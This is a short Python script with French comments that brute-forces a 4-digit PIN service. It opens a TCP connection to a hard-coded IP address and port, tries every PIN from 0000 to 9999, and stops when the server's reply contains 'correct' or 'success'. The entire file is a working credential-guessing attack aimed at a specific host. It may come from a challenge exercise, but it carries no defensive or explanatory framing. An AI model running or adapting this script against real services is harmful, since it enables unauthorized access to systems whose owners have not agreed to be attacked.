import socket

# Adresse IP et port du service
adresse_ip = '51.195.253.124'
port = 12345

# Fonction pour essayer un code PIN donné
def tester_pin(pin):
    try:
        # Création d'un socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Connexion au serveur
            s.connect((adresse_ip, port))
            
            # Envoyer le code PIN (il faut ajouter \n si le service attend un retour à la ligne après le PIN)
            s.sendall(pin.encode() + b'\n')
            
            # Réception de la réponse du serveur
            reponse = s.recv(1024).decode()
            print(f"Réponse pour PIN {pin}: {reponse}")
            
            # Vérifier si la réponse indique que le PIN est correct
            if "correct" in reponse.lower() or "success" in reponse.lower():
                print(f"Mot de passe trouvé : {pin}")
                return True
            
    except Exception as e:
        print(f"Erreur avec le PIN {pin}: {e}")
    
    return False

# Générer tous les codes PIN possibles de 0000 à 9999
for i in range(10000):
    pin = f"{i:04d}"  # Formate le nombre en PIN à 4 chiffres, ex: 0001, 0123, etc.
    if tester_pin(pin):
        break  # Arrêter si le PIN correct est trouvé
